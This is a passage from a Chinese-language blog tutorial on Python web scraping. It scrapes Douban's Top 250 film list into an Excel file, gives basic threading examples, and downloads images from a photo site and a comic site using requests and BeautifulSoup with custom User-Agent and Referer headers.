class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现都在class=”grid_view”里面，我们需要得到序号，图片url，名称，作者评分，和短评。然后写入exlsx</p><p>先介绍个xlwt库，这个库就是可以将数据写入excel的库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="comment"># 创建一个workbook 设置编码</span></span><br><span class="line">workbook = xlwt.Workbook(encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建一个worksheet</span></span><br><span class="line">worksheet = workbook.add_sheet(<span class="string">&#x27;My Worksheet&#x27;</span>)</span><br><span class="line"><span class="comment"># 写入excel</span></span><br><span class="line"><span class="comment"># 参数对应 行, 列, 值</span></span><br><span class="line">worksheet.write(<span class="number">1</span>,<span class="number">0</span>, label = <span class="string">&#x27;this is test&#x27;</span>)</span><br></pre></td></tr></table></figure><p>完整python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建excel，添加第一行的信息</span></span><br><span class="line">workbook = xlwt.Workbook(encoding = <span class="string">&#x27;utf-8&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">worksheet = workbook.add_sheet(<span class="string">&#x27;豆瓣电影Top250&#x27;</span>, cell_overwrite_ok=<span class="literal">True</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;名称&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;图片&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;排名&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&#x27;评分&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">5</span>, <span class="string">&#x27;简介&#x27;</span>)</span><br><span class="line"></span><br><span class="line">n=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_useful_xlwt</span>(<span class="params">html</span>):</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#利用BeautifulSoup去寻找</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        item_index=item.find(class_=<span class="string">&#x27;&#x27;</span>).string</span><br><span class="line">        item_name=item.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">        item_picture=item.find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        item_author=item.find(<span class="string">&#x27;p&#x27;</span>).text.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">0</span>:<span class="number">20</span>]</span><br><span class="line">        item_score=item.find(class_=<span class="string">&#x27;rating_num&#x27;</span>).string</span><br><span class="line">        <span class="keyword">if</span> item.find(class_=<span class="string">&quot;inq&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            item_intr=item.find(class_=<span class="string">&quot;inq&quot;</span>).string</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(&#x27;爬取电影：&#x27; + item_index + &#x27; | &#x27;+ item_picture + &#x27; | &#x27; + item_name + &#x27; | &#x27; + item_autor + &#x27; | &#x27; + item_score + &#x27; | &#x27; + item_intr)</span></span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line"></span><br><span class="line">        worksheet.write(n, <span class="number">0</span>, item_name)</span><br><span class="line">        worksheet.write(n, <span class="number">1</span>, item_picture)</span><br><span class="line">        worksheet.write(n, <span class="number">2</span>, item_index)</span><br><span class="line">        worksheet.write(n, <span class="number">3</span>, item_score)</span><br><span class="line">        worksheet.write(n, <span class="number">4</span>, item_author)</span><br><span class="line">        worksheet.write(n, <span class="number">5</span>, item_intr)</span><br><span class="line">        n=n+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">i</span>):</span></span><br><span class="line">    url=<span class="string">&#x27;https://movie.douban.com/top250?start=&#x27;</span> + <span class="built_in">str</span>(i * <span class="number">25</span>) + <span class="string">&#x27;&amp;filter=&#x27;</span></span><br><span class="line">    html=request_juger(url)</span><br><span class="line">    find_useful_xlwt(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        main(i)</span><br><span class="line"><span class="comment">#保存文件，后缀名需要为xls</span></span><br><span class="line">workbook.save(<span class="string">u&#x27;豆瓣最受欢迎的250部电影.xls&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>一个菜鸟上的例子，创建了一个线程类，继承threading.Thread</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">exitFlag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> (<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, threadID, name, counter</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="comment">#定义了一个 run 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;开始线程：&quot;</span> + self.name)</span><br><span class="line">        print_time(self.name, self.counter, <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;退出线程：&quot;</span> + self.name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_time</span>(<span class="params">threadName, delay, counter</span>):</span></span><br><span class="line">    <span class="keyword">while</span> counter:</span><br><span class="line">        <span class="keyword">if</span> exitFlag:</span><br><span class="line">            threadName.exit()</span><br><span class="line">        time.sleep(delay)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;%s: %s&quot;</span> % (threadName, time.ctime(time.time())))</span><br><span class="line">        counter -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新线程</span></span><br><span class="line">thread1 = myThread(<span class="number">1</span>, <span class="string">&quot;Thread-1&quot;</span>, <span class="number">1</span>)</span><br><span class="line">thread2 = myThread(<span class="number">2</span>, <span class="string">&quot;Thread-2&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启新线程</span></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br><span class="line">thread1.join()</span><br><span class="line">thread2.join()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;退出主线程&quot;</span>)</span><br></pre></td></tr></table></figure><p>线程锁，用来保证公共数据在某一时间只会被一个线程使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;开启线程： &quot;</span> + self.name)</span><br><span class="line">        <span class="comment"># 获取锁，用于线程同步</span></span><br><span class="line">        threadLock.acquire()</span><br><span class="line">        print_time(self.name, self.counter, <span class="number">3</span>)</span><br><span class="line">        <span class="comment"># 释放锁，开启下一个线程</span></span><br><span class="line">        threadLock.release()</span><br><span class="line"></span><br><span class="line">threadLock = threading.Lock()</span><br></pre></td></tr></table></figure><h2 id="第三个爬虫"><a href="#第三个爬虫" class="headerlink" title="第三个爬虫"></a>第三个爬虫</h2><p>爬取某一网站上的图片，嘿嘿嘿。</p><p>一个用来判断是否可以下载图片的小步骤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://s2.baozimh.com&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;111.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    img = requests.get(<span class="string">&#x27;https://s2.baozimh.com/scomic/douluodalu-fengxuandongman/0/9-htxl/2.jpg&#x27;</span>, headers=headers).content</span><br><span class="line">    f.write(img)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面的一个项目中的例子，自己也写了写，真不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">            <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://www.mzitu.com/all/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://www.mzitu.com/all/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page_urls</span>():</span></span><br><span class="line">    base_url = <span class="string">&#x27;https://www.mzitu.com/page/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(i)</span><br><span class="line">        html=request_juger(url)</span><br><span class="line">        soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;postlist&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        meizi_url=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            meizi_url.append(i.find(<span class="string">&#x27;span&#x27;</span>).find(<span class="string">&#x27;a&#x27;</span>).get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> meizi_url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_Pic</span>(<span class="params">title, image_list</span>):</span></span><br><span class="line">    <span class="comment"># 新建文件夹</span></span><br><span class="line">    os.mkdir(title)</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 下载图片</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> image_list:</span><br><span class="line">        filename = <span class="string">&#x27;%s/%s.jpg&#x27;</span> % (title, <span class="built_in">str</span>(j))</span><br><span class="line">        print(<span class="string">&#x27;downloading....%s : NO.%s&#x27;</span> % (title, <span class="built_in">str</span>(j)))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            img = requests.get(url=item,headers=header).content</span><br><span class="line">            f.write(img)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_images</span>(<span class="params">url</span>):</span></span><br><span class="line">    pages=[]</span><br><span class="line"></span><br><span class="line">    html = request_juger(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    title=soup.find(<span class="string">&#x27;h2&#x27;</span>).string</span><br><span class="line">    page=soup.find(class_=<span class="string">&#x27;pagenavi&#x27;</span>).find_all(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">2</span>].find(<span class="string">&#x27;span&#x27;</span>).string</span><br><span class="line"></span><br><span class="line">    image_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">int</span>(page)):</span><br><span class="line">        html = request_juger(url + <span class="string">&#x27;/%s&#x27;</span> % i)</span><br><span class="line">        soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        img_url = soup.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        image_list.append(img_url)</span><br><span class="line">    print(image_list)</span><br><span class="line">    download_Pic(title, image_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    urls=get_page_urls()</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        download_images(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>照猫画虎，去爬了点漫画，斗罗大陆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://s2.baozimh.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#检测响应是否正确，一般是200，正确就会返回服务器传回来的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_juger</span>(<span class="params">url</span>):</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                <span class="string">&#x27;Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://s2.baozimh.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提起有用信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page_urls</span>():</span></span><br><span class="line">    base_url = <span class="string">&#x27;https://cn.webmota.com/comic/chapter/douluodalu-fengxuandongman/0_&#x27;</span></span><br><span class="line">    manhua_url = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(i) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        manhua_url.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> manhua_url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_Pic</span>(<span class="params">title, image_list</span>):</span></span><br><span class="line">    <span class="comment"># 新建文件夹</span></span><br><span class="line">    os.mkdir(title)</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 下载图片</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> image_list:</span><br><span class="line">        filename = <span class="string">&#x27;%s/%s.jpg&#x27;</span> % (title, <span class="built_in">str</span>(j))</span><br><span class="line">        print(<span class="string">&#x27;downloading....%s : NO.%s&#x27;</span> % (title, <span class="built_in">str</span>(j)))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            img = requests.get(url=item,headers=header).content</span><br><span class="line">            f.write(img)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_images</span>(<span class="params">url</span>):</span></span><br><span class="line">    html = request_juger(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    title=soup.find(<span class="string">&#x27;head&#x27;</span>).find(<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">    <span class="built_in">list</span>=[]</span><br><span class="line">    page=soup.find(class_=<span class="string">&#x27;comic-text__amp&#x27;</span>).find(<span class="string">&#x27;em&#x27;</span>).string.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(page)):</span><br><span class="line">        <span class="built_in">list</span>.append(soup.find_all(<span class="string">&#x27;img&#x27;</span>)[i].get(<span class="string">&#x27;src&#x27;</span>))</span><br><span class="line">    download_Pic(title,<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    urls=get_page_urls()</span><br><span class="line">    print(urls)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        download_images(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>若要多线程爬，直接导入相应线程库，弄成下面这种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 